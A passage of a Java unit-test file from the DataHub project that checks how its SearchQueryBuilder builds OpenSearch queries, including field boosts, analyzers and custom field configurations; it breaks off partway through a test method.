package com.linkedin.metadata.search.query.request;

import static com.linkedin.metadata.config.search.EntityTypeListConfig.DEFAULT_AUTOCOMPLETE_ENTITY_TYPES;
import static com.linkedin.metadata.config.search.EntityTypeListConfig.DEFAULT_SEARCH_ENTITY_TYPES;
import static com.linkedin.metadata.config.search.EntityTypeListConfig.parseCsv;
import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.TEXT_SEARCH_ANALYZER;
import static com.linkedin.metadata.search.elasticsearch.index.entity.v2.V2LegacySettingsBuilder.URN_SEARCH_ANALYZER;
import static com.linkedin.metadata.search.elasticsearch.query.request.SearchQueryBuilder.STRUCTURED_QUERY_PREFIX;
import static io.datahubproject.test.search.SearchTestUtils.TEST_OS_SEARCH_CONFIG;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;
import static org.testng.Assert.assertEquals;
import static org.testng.Assert.assertFalse;
import static org.testng.Assert.assertNotNull;
import static org.testng.Assert.assertNull;
import static org.testng.Assert.assertTrue;

import com.fasterxml.jackson.dataformat.yaml.YAMLMapper;
import com.google.common.collect.ImmutableList;
import com.linkedin.data.schema.DataSchema;
import com.linkedin.data.schema.PathSpec;
import com.linkedin.data.template.SetMode;
import com.linkedin.metadata.TestEntitySpecBuilder;
import com.linkedin.metadata.config.search.CustomConfiguration;
import com.linkedin.metadata.config.search.ExactMatchConfiguration;
import com.linkedin.metadata.config.search.PartialConfiguration;
import com.linkedin.metadata.config.search.SearchConfiguration;
import com.linkedin.metadata.config.search.SearchValidationConfiguration;
import com.linkedin.metadata.config.search.WordGramConfiguration;
import com.linkedin.metadata.config.search.custom.CustomSearchConfiguration;
import com.linkedin.metadata.config.search.custom.FieldConfiguration;
import com.linkedin.metadata.config.search.custom.QueryConfiguration;
import com.linkedin.metadata.config.search.custom.SearchFields;
import com.linkedin.metadata.entity.validation.ValidationException;
import com.linkedin.metadata.models.EntitySpec;
import com.linkedin.metadata.models.SearchableFieldSpec;
import com.linkedin.metadata.models.annotation.SearchableAnnotation;
import com.linkedin.metadata.models.registry.EntityRegistry;
import com.linkedin.metadata.query.SearchFlags;
import com.linkedin.metadata.search.elasticsearch.query.request.SearchFieldConfig;
import com.linkedin.metadata.search.elasticsearch.query.request.SearchQueryBuilder;
import com.linkedin.util.Pair;
import io.datahubproject.metadata.context.OperationContext;
import io.datahubproject.metadata.context.SearchContext;
import io.datahubproject.test.metadata.context.TestOperationContexts;
import io.datahubproject.test.search.config.SearchCommonTestConfiguration;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Set;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import java.util.stream.Stream;
import org.opensearch.index.query.BoolQueryBuilder;
import org.opensearch.index.query.ConstantScoreQueryBuilder;
import org.opensearch.index.query.DisMaxQueryBuilder;
import org.opensearch.index.query.MatchAllQueryBuilder;
import org.opensearch.index.query.MatchPhrasePrefixQueryBuilder;
import org.opensearch.index.query.MatchPhraseQueryBuilder;
import org.opensearch.index.query.MatchQueryBuilder;
import org.opensearch.index.query.MultiMatchQueryBuilder;
import org.opensearch.index.query.Operator;
import org.opensearch.index.query.QueryBuilder;
import org.opensearch.index.query.QueryStringQueryBuilder;
import org.opensearch.index.query.SimpleQueryStringBuilder;
import org.opensearch.index.query.TermQueryBuilder;
import org.opensearch.index.query.WildcardQueryBuilder;
import org.opensearch.index.query.functionscore.FunctionScoreQueryBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Import;
import org.springframework.test.context.testng.AbstractTestNGSpringContextTests;
import org.testng.annotations.Test;

@Import(SearchCommonTestConfiguration.class)
public class SearchQueryBuilderTest extends AbstractTestNGSpringContextTests {

  @Autowired
  @Qualifier("queryOperationContext")
  private OperationContext operationContext;

  @Autowired
  @Qualifier("defaultTestCustomSearchConfig")
  private CustomSearchConfiguration customSearchConfiguration;

  public static SearchConfiguration testQueryConfig;

  static {
    testQueryConfig = TEST_OS_SEARCH_CONFIG.getSearch();
    testQueryConfig.setMaxTermBucketSize(20);

    ExactMatchConfiguration exactMatchConfiguration = new ExactMatchConfiguration();
    exactMatchConfiguration.setExclusive(false);
    exactMatchConfiguration.setExactFactor(10.0f);
    exactMatchConfiguration.setWithPrefix(true);
    exactMatchConfiguration.setPrefixFactor(6.0f);
    exactMatchConfiguration.setCaseSensitivityFactor(0.7f);
    exactMatchConfiguration.setEnableStructured(true);

    WordGramConfiguration wordGramConfiguration = new WordGramConfiguration();
    wordGramConfiguration.setTwoGramFactor(1.2f);
    wordGramConfiguration.setThreeGramFactor(1.5f);
    wordGramConfiguration.setFourGramFactor(1.8f);

    PartialConfiguration partialConfiguration = new PartialConfiguration();
    partialConfiguration.setFactor(0.4f);
    partialConfiguration.setUrnFactor(0.7f);

    SearchValidationConfiguration searchValidationConfiguration =
        new SearchValidationConfiguration();
    searchValidationConfiguration.setMaxQueryLength(500);

    testQueryConfig.setExactMatch(exactMatchConfiguration);
    testQueryConfig.setWordGram(wordGramConfiguration);
    testQueryConfig.setPartial(partialConfiguration);
    testQueryConfig.setValidation(searchValidationConfiguration);
  }

  public static final SearchQueryBuilder TEST_BUILDER =
      new SearchQueryBuilder(testQueryConfig, null);

  /** Builds the Stage 1 query that Search V3 keyword reads run. */
  public static final SearchQueryBuilder TEST_V3_BUILDER =
      new SearchQueryBuilder(testQueryConfig, null, true);

  public OperationContext opContext = TestOperationContexts.systemContextNoSearchAuthorization();

  @Test
  public void testQueryBuilderFulltext() {
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            TEST_BUILDER.buildQuery(
                opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", true);
    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();
    assertEquals(shouldQueries.size(), 2);

    BoolQueryBuilder analyzerGroupQuery = (BoolQueryBuilder) shouldQueries.get(0);

    SimpleQueryStringBuilder keywordQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(0);
    assertEquals(keywordQuery.value(), "testQuery");
    assertEquals(keywordQuery.analyzer(), "keyword");
    Map<String, Float> keywordFields = keywordQuery.fields();
    assertEquals(keywordFields.size(), 14);

    assertEquals(keywordFields.get("urn"), 10);
    assertEquals(keywordFields.get("textArrayField"), 1);
    assertEquals(keywordFields.get("customProperties"), 1);
    assertEquals(keywordFields.get("wordGramField"), 1);
    assertEquals(keywordFields.get("nestedArrayArrayField"), 1);
    assertEquals(keywordFields.get("textFieldOverride"), 1);
    assertEquals(keywordFields.get("nestedArrayStringField"), 1);
    assertEquals(keywordFields.get("keyPart1"), 10);
    assertEquals(keywordFields.get("esObjectField"), 1);
    assertEquals(keywordFields.get("esObjectFieldFloat"), 1);
    assertEquals(keywordFields.get("esObjectFieldDouble"), 1);
    assertEquals(keywordFields.get("esObjectFieldLong"), 1);
    assertEquals(keywordFields.get("esObjectFieldInteger"), 1);
    assertEquals(keywordFields.get("esObjectFieldBoolean"), 1);

    SimpleQueryStringBuilder urnComponentQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(1);
    assertEquals(urnComponentQuery.value(), "testQuery");
    assertEquals(urnComponentQuery.analyzer(), URN_SEARCH_ANALYZER);
    assertEquals(
        urnComponentQuery.fields(),
        Map.of(
            "nestedForeignKey", 1.0f,
            "foreignKey", 1.0f));

    SimpleQueryStringBuilder fulltextQuery =
        (SimpleQueryStringBuilder) analyzerGroupQuery.should().get(2);
    assertEquals(fulltextQuery.value(), "testQuery");
    assertEquals(fulltextQuery.analyzer(), TEXT_SEARCH_ANALYZER);
    assertEquals(
        fulltextQuery.fields(),
        Map.of(
            "textFieldOverride.delimited", 0.4f,
            "keyPart1.delimited", 4.0f,
            "nestedArrayArrayField.delimited", 0.4f,
            "urn.delimited", 7.0f,
            "textArrayField.delimited", 0.4f,
            "nestedArrayStringField.delimited", 0.4f,
            "wordGramField.delimited", 0.4f,
            "customProperties.delimited", 0.4f));

    BoolQueryBuilder boolPrefixQuery = (BoolQueryBuilder) shouldQueries.get(1);
    assertTrue(boolPrefixQuery.should().size() > 0);

    List<Pair<String, Float>> prefixFieldWeights =
        boolPrefixQuery.should().stream()
            .map(
                prefixQuery -> {
                  if (prefixQuery instanceof MatchPhrasePrefixQueryBuilder) {
                    MatchPhrasePrefixQueryBuilder builder =
                        (MatchPhrasePrefixQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  } else if (prefixQuery instanceof TermQueryBuilder) {
                    // exact
                    TermQueryBuilder builder = (TermQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  } else { // if (prefixQuery instanceof MatchPhraseQueryBuilder) {
                    // ngram
                    MatchPhraseQueryBuilder builder = (MatchPhraseQueryBuilder) prefixQuery;
                    return Pair.of(builder.fieldName(), builder.boost());
                  }
                })
            .collect(Collectors.toList());

    assertEquals(prefixFieldWeights.size(), 39);

    List.of(
            Pair.of("urn", 100.0f),
            Pair.of("urn", 70.0f),
            Pair.of("keyPart1.delimited", 16.8f),
            Pair.of("keyPart1.keyword", 100.0f),
            Pair.of("keyPart1.keyword", 70.0f),
            Pair.of("wordGramField.wordGrams2", 1.44f),
            Pair.of("wordGramField.wordGrams3", 2.25f),
            Pair.of("wordGramField.wordGrams4", 3.2399998f),
            Pair.of("wordGramField.keyword", 10.0f),
            Pair.of("wordGramField.keyword", 7.0f))
        .forEach(p -> assertTrue(prefixFieldWeights.contains(p), "Missing: " + p));

    // Validate scorer
    FunctionScoreQueryBuilder.FilterFunctionBuilder[] scoringFunctions =
        result.filterFunctionBuilders();
    assertEquals(scoringFunctions.length, 3);
  }

  @Test
  public void testQueryBuilderStructured() {
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            TEST_BUILDER.buildQuery(
                opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), "testQuery", false);
    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    List<QueryBuilder> shouldQueries = mainQuery.should();
    assertEquals(shouldQueries.size(), 2);

    QueryStringQueryBuilder keywordQuery = (QueryStringQueryBuilder) shouldQueries.get(0);
    assertEquals(keywordQuery.queryString(), "testQuery");
    assertNull(keywordQuery.analyzer());
    Map<String, Float> keywordFields = keywordQuery.fields();
    assertEquals(keywordFields.size(), 27);
    assertEquals(keywordFields.get("keyPart1").floatValue(), 10.0f);
    assertFalse(keywordFields.containsKey("keyPart3"));
    assertEquals(keywordFields.get("textFieldOverride").floatValue(), 1.0f);
    assertEquals(keywordFields.get("customProperties").floatValue(), 1.0f);
    assertEquals(keywordFields.get("esObjectField").floatValue(), 1.0f);

    // Validate scorer
    FunctionScoreQueryBuilder.FilterFunctionBuilder[] scoringFunctions =
        result.filterFunctionBuilders();
    assertEquals(scoringFunctions.length, 3);
  }

  private static final SearchQueryBuilder TEST_CUSTOM_BUILDER;

  static {
    try {
      CustomConfiguration customConfiguration = new CustomConfiguration();
      customConfiguration.setEnabled(true);
      customConfiguration.setFile("search_config_builder_test.yml");
      CustomSearchConfiguration customSearchConfiguration =
          customConfiguration.resolve(new YAMLMapper());
      TEST_CUSTOM_BUILDER = new SearchQueryBuilder(testQueryConfig, customSearchConfiguration);
    } catch (IOException e) {
      throw new RuntimeException(e);
    }
  }

  @Test
  public void testCustomSelectAll() {
    for (String triggerQuery : List.of("*", "")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 0);
    }
  }

  @Test
  public void testCustomExactMatch() {
    for (String triggerQuery : List.of("test_table", "'single quoted'", "\"double quoted\"")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 1, String.format("Expected query for `%s`", triggerQuery));

      BoolQueryBuilder boolPrefixQuery = (BoolQueryBuilder) shouldQueries.get(0);
      assertTrue(boolPrefixQuery.should().size() > 0);

      List<QueryBuilder> queries =
          boolPrefixQuery.should().stream()
              .map(
                  prefixQuery -> {
                    if (prefixQuery instanceof MatchPhrasePrefixQueryBuilder) {
                      // prefix
                      return (MatchPhrasePrefixQueryBuilder) prefixQuery;
                    } else if (prefixQuery instanceof TermQueryBuilder) {
                      // exact
                      return (TermQueryBuilder) prefixQuery;
                    } else { // if (prefixQuery instanceof MatchPhraseQueryBuilder) {
                      // ngram
                      return (MatchPhraseQueryBuilder) prefixQuery;
                    }
                  })
              .collect(Collectors.toList());

      assertFalse(queries.isEmpty(), "Expected queries with specific types");
    }
  }

  @Test
  public void testCustomDefault() {
    for (String triggerQuery : List.of("foo", "bar", "foo\"bar", "foo:bar")) {
      FunctionScoreQueryBuilder result =
          (FunctionScoreQueryBuilder)
              TEST_CUSTOM_BUILDER.buildQuery(
                  opContext, ImmutableList.of(TestEntitySpecBuilder.getSpec()), triggerQuery, true);

      BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
      List<QueryBuilder> shouldQueries = mainQuery.should();
      assertEquals(shouldQueries.size(), 3);

      List<QueryBuilder> queries =
          mainQuery.should().stream()
              .map(
                  query -> {
                    if (query instanceof SimpleQueryStringBuilder) {
                      return (SimpleQueryStringBuilder) query;
                    } else if (query instanceof MatchAllQueryBuilder) {
                      // custom
                      return (MatchAllQueryBuilder) query;
                    } else {
                      // exact
                      return (BoolQueryBuilder) query;
                    }
                  })
              .collect(Collectors.toList());

      assertEquals(queries.size(), 3, "Expected queries with specific types");

      // validate query injection
      List<QueryBuilder> mustQueries = mainQuery.must();
      assertEquals(mustQueries.size(), 1);
      TermQueryBuilder termQueryBuilder = (TermQueryBuilder) mainQuery.must().get(0);

      assertEquals(termQueryBuilder.fieldName(), "fieldName");
      assertEquals(termQueryBuilder.value().toString(), triggerQuery);
    }
  }

  /** Tests to make sure that the fields are correctly combined across search-able entities */
  @Test
  public void testGetStandardFieldsEntitySpec() {
    List<String> entityTypeNames =
        Stream.concat(
                parseCsv(DEFAULT_SEARCH_ENTITY_TYPES).stream(),
                parseCsv(DEFAULT_AUTOCOMPLETE_ENTITY_TYPES).stream())
            .distinct()
            .collect(Collectors.toList());
    // Distinct configured defaults (search ∪ autocomplete) — not an arbitrary registry-wide count.
    assertTrue(
        entityTypeNames.size() >= 20,
        "Expected at least 20 distinct default search/autocomplete entity types");

    List<EntitySpec> entitySpecs =
        entityTypeNames.stream()
            .map(entityType -> operationContext.getEntityRegistry().getEntitySpec(entityType))
            .collect(Collectors.toList());
    assertEquals(entitySpecs.size(), entityTypeNames.size());

    // Count of the distinct field names
    Set<String> expectedFieldNames =
        Stream.concat(
                // Standard urn fields plus entitySpec sourced fields
                Stream.of("urn", "urn.delimited"),
                entitySpecs.stream()
                    .flatMap(
                        spec ->
                            TEST_CUSTOM_BUILDER
                                .getFieldsFromEntitySpec(operationContext.getEntityRegistry(), spec)
                                .stream())
                    .map(SearchFieldConfig::fieldName))
            .collect(Collectors.toSet());

    Set<String> actualFieldNames =
        TEST_CUSTOM_BUILDER
            .getStandardFields(operationContext.getEntityRegistry(), entitySpecs)
            .stream()
            .map(SearchFieldConfig::fieldName)
            .collect(Collectors.toSet());

    assertEquals(
        actualFieldNames,
        expectedFieldNames,
        String.format(
            "Missing: %s Extra: %s",
            expectedFieldNames.stream()
                .filter(f -> !actualFieldNames.contains(f))
                .collect(Collectors.toSet()),
            actualFieldNames.stream()
                .filter(f -> !expectedFieldNames.contains(f))
                .collect(Collectors.toSet())));
  }

  @Test
  public void testGetStandardFields() {
    Set<SearchFieldConfig> fieldConfigs =
        TEST_CUSTOM_BUILDER.getStandardFields(
            mock(EntityRegistry.class), ImmutableList.of(TestEntitySpecBuilder.getSpec()));
    assertEquals(fieldConfigs.size(), 27);
    assertEquals(
        fieldConfigs.stream().map(SearchFieldConfig::fieldName).collect(Collectors.toSet()),
        Set.of(
            "nestedArrayArrayField",
            "esObjectField",
            "foreignKey",
            "keyPart1",
            "nestedForeignKey",
            "textArrayField.delimited",
            "nestedArrayArrayField.delimited",
            "wordGramField.delimited",
            "wordGramField.wordGrams4",
            "textFieldOverride",
            "nestedArrayStringField.delimited",
            "urn.delimited",
            "textArrayField",
            "keyPart1.delimited",
            "nestedArrayStringField",
            "wordGramField",
            "customProperties",
            "wordGramField.wordGrams3",
            "textFieldOverride.delimited",
            "urn",
            "wordGramField.wordGrams2",
            "customProperties.delimited",
            "esObjectFieldBoolean",
            "esObjectFieldInteger",
            "esObjectFieldDouble",
            "esObjectFieldFloat",
            "esObjectFieldLong")); // customProperties.delimited Saas only

    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("keyPart1"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(10.0F));
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("nestedForeignKey"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("textFieldOverride"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));

    EntitySpec mockEntitySpec = mock(EntitySpec.class);
    when(mockEntitySpec.getSearchableFieldSpecs())
        .thenReturn(
            List.of(
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "fieldDoesntExistInOriginal",
                        SearchableAnnotation.FieldType.TEXT,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        13.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class)),
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "keyPart1",
                        SearchableAnnotation.FieldType.KEYWORD,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        20.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class)),
                new SearchableFieldSpec(
                    mock(PathSpec.class),
                    new SearchableAnnotation(
                        "textFieldOverride",
                        SearchableAnnotation.FieldType.WORD_GRAM,
                        true,
                        true,
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        3.0,
                        Optional.<String>empty(),
                        Optional.<String>empty(),
                        Collections.<Object, Double>emptyMap(),
                        Collections.<String>emptyList(),
                        false,
                        false,
                        Optional.<String>empty(),
                        Optional.<Integer>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        Optional.<String>empty(),
                        Optional.<Boolean>empty(),
                        false),
                    mock(DataSchema.class))));

    fieldConfigs =
        TEST_CUSTOM_BUILDER.getStandardFields(
            mock(EntityRegistry.class),
            ImmutableList.of(TestEntitySpecBuilder.getSpec(), mockEntitySpec));
    // Same 22 from the original entity + newFieldNotInOriginal + 3 word gram fields from the
    // textFieldOverride
    assertEquals(fieldConfigs.size(), 32);
    assertEquals(
        fieldConfigs.stream().map(SearchFieldConfig::fieldName).collect(Collectors.toSet()),
        Set.of(
            "nestedArrayArrayField",
            "esObjectField",
            "foreignKey",
            "keyPart1",
            "nestedForeignKey",
            "textArrayField.delimited",
            "nestedArrayArrayField.delimited",
            "wordGramField.delimited",
            "wordGramField.wordGrams4",
            "textFieldOverride",
            "nestedArrayStringField.delimited",
            "urn.delimited",
            "textArrayField",
            "keyPart1.delimited",
            "nestedArrayStringField",
            "wordGramField",
            "customProperties",
            "wordGramField.wordGrams3",
            "textFieldOverride.delimited",
            "urn",
            "wordGramField.wordGrams2",
            "fieldDoesntExistInOriginal",
            "fieldDoesntExistInOriginal.delimited",
            "textFieldOverride.wordGrams2",
            "textFieldOverride.wordGrams3",
            "textFieldOverride.wordGrams4",
            "customProperties.delimited",
            "esObjectFieldBoolean",
            "esObjectFieldInteger",
            "esObjectFieldDouble",
            "esObjectFieldFloat",
            "esObjectFieldLong"));

    // Field which only exists in first one: Should be the same
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("nestedForeignKey"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(1.0F));
    // Average boost value: 10 vs. 20 -> 15
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("keyPart1"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(15.0F));
    // Field which added word gram fields: Original boost should be boost value averaged
    assertEquals(
        fieldConfigs.stream()
            .filter(field -> field.fieldName().equals("textFieldOverride"))
            .findFirst()
            .map(SearchFieldConfig::boost),
        Optional.of(2.0F));
  }

  @Test
  public void testStandardFieldsQueryByDefault() {
    assertTrue(
        TEST_BUILDER
            .getStandardFields(
                opContext.getEntityRegistry(),
                opContext.getEntityRegistry().getEntitySpecs().values())
            .stream()
            .allMatch(SearchFieldConfig::isQueryByDefault),
        "Expect all search fields to be queryByDefault.");
  }

  @Test
  public void testSearchFieldConfigurationInSimpleQuery() {
    // Create a custom configuration with field configurations
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "minimal",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder()
                                .replace(List.of("keyPart1", "textFieldOverride"))
                                .build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Create operation context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("minimal");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);
    SimpleQueryStringBuilder simpleQuery =
        (SimpleQueryStringBuilder)
            shouldQuery.should().stream()
                .filter(q -> q instanceof SimpleQueryStringBuilder)
                .findFirst()
                .orElse(null);

    assertNotNull(simpleQuery);
    Map<String, Float> fields = simpleQuery.fields();

    // Should only contain the replaced fields
    assertTrue(fields.containsKey("keyPart1"));
    assertTrue(fields.containsKey("textFieldOverride"));
    assertFalse(fields.containsKey("customProperties"));
    assertFalse(fields.containsKey("textArrayField"));
  }

  @Test
  public void testSearchFieldConfigurationWithAddRemove() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "custom",
                    FieldConfiguration.builder()
                        .searchFields(
                            SearchFields.builder()
                                .add(List.of("nestedForeignKey"))
                                .remove(List.of("customProperties", "textArrayField"))
                                .build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Create operation context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("custom");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithFieldConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);

    // Collect all fields from simple query string builders
    Set<String> allFields =
        shouldQuery.should().stream()
            .filter(q -> q instanceof SimpleQueryStringBuilder)
            .flatMap(q -> ((SimpleQueryStringBuilder) q).fields().keySet().stream())
            .collect(Collectors.toSet());

    // nestedForeignKey should be added (it's not queryByDefault normally)
    assertTrue(allFields.contains("nestedForeignKey"));
    // customProperties and textArrayField should be removed
    assertFalse(allFields.contains("customProperties"));
    assertFalse(allFields.contains("textArrayField"));
    // Other fields should still be present
    assertTrue(allFields.contains("keyPart1"));
    assertTrue(allFields.contains("urn"));
  }

  @Test
  public void testSearchFieldConfigurationWithWildcardPatterns() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "wildcard",
                    FieldConfiguration.builder()
                        .searchFields(SearchFields.builder().add(List.of("nestedArray.*")).build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Mock context with field configuration
    OperationContext opContextWithFieldConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags = new SearchFlags().setFulltext(true).setFieldConfiguration("wildcard");

    when(opContextWithFieldConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithFieldConfig.getObjectMapper()).thenReturn(operationContext.getObjectMapper());
    when(opContextWithFieldConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Get the fields that would be configured
    Set<SearchFieldConfig> baseFields =
        builderWithFieldConfig.getStandardFields(
            operationContext.getEntityRegistry(),
            ImmutableList.of(TestEntitySpecBuilder.getSpec()));

    // The pattern should match fields starting with "nestedArray."
    assertTrue(baseFields.stream().anyMatch(f -> f.fieldName().equals("nestedArrayStringField")));
    assertTrue(baseFields.stream().anyMatch(f -> f.fieldName().equals("nestedArrayArrayField")));
  }

  @Test
  public void testSearchFieldConfigurationWithInvalidLabel() {
    CustomSearchConfiguration customConfig =
        CustomSearchConfiguration.builder()
            .fieldConfigurations(
                Map.of(
                    "valid",
                    FieldConfiguration.builder()
                        .searchFields(SearchFields.builder().replace(List.of("keyPart1")).build())
                        .build()))
            .queryConfigurations(
                List.of(QueryConfiguration.builder().queryRegex(".*").simpleQuery(true).build()))
            .build();

    SearchQueryBuilder builderWithFieldConfig =
        new SearchQueryBuilder(testQueryConfig, customConfig);

    // Test with invalid field configuration label
    OperationContext opContextWithInvalidConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
        new SearchFlags().setFulltext(true).setFieldConfiguration("nonexistent");

    when(opContextWithInvalidConfig.getEntityRegistry())
        .thenReturn(operationContext.getEntityRegistry());
    when(opContextWithInvalidConfig.getObjectMapper())
        .thenReturn(operationContext.getObjectMapper());
    when(opContextWithInvalidConfig.getSearchContext()).thenReturn(searchContext);
    when(searchContext.getSearchFlags()).thenReturn(searchFlags);

    // Should use default fields when label doesn't exist
    FunctionScoreQueryBuilder result =
        (FunctionScoreQueryBuilder)
            builderWithFieldConfig.buildQuery(
                opContextWithInvalidConfig,
                ImmutableList.of(TestEntitySpecBuilder.getSpec()),
                "testQuery",
                true);

    BoolQueryBuilder mainQuery = (BoolQueryBuilder) result.query();
    BoolQueryBuilder shouldQuery = (BoolQueryBuilder) mainQuery.should().get(0);

    // Should have all default fields since invalid label falls back to defaults
    Set<String> allFields =
        shouldQuery.should().stream()
            .filter(q -> q instanceof SimpleQueryStringBuilder)
            .flatMap(q -> ((SimpleQueryStringBuilder) q).fields().keySet().stream())
            .collect(Collectors.toSet());

    assertTrue(allFields.contains("customProperties"));
    assertTrue(allFields.contains("textArrayField"));
    assertTrue(allFields.contains("keyPart1"));
  }

  @Test
  public void testSearchFieldConfigurationNullSafety() {
    SearchQueryBuilder builderWithNullConfig = new SearchQueryBuilder(testQueryConfig, null);

    // Test with null field configuration in search flags
    OperationContext opContextNullConfig = mock(OperationContext.class);
    SearchContext searchContext = mock(SearchContext.class);
    SearchFlags searchFlags =
